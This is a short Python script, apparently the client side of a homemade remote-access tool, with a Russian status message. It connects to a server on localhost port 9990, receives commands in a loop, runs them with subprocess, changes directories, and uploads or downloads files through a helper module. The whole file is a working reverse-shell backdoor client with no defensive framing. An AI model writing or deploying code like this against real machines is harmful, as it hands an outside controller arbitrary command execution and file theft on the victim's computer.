import socket 
import subprocess
import os
import controler 

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

client_socket.connect(("127.0.0.1", 9990)) 



print('Соединение успешно') 

while True: 
    try:
        command = client_socket.recv(1024).decode() 

        if 'cd' in command:
            file_name = command.split(' ')[1]
            os.chdir('./' + file_name)
            client_socket.send(file_name.encode())

        elif 'ls' in command: 
            client_socket.send(subprocess.check_output(command))

        elif 'get_file' in command:
            controler.send_file(client_socket, command)

        elif 'send_file' in command:
            controler.recv_file(client_socket, command)

        else:
            command_args = command.split(' ')
            client_socket.send(subprocess.check_output(command_args))

    except Exception as e:
        client_socket.send(str(e).encode())
        print(e)
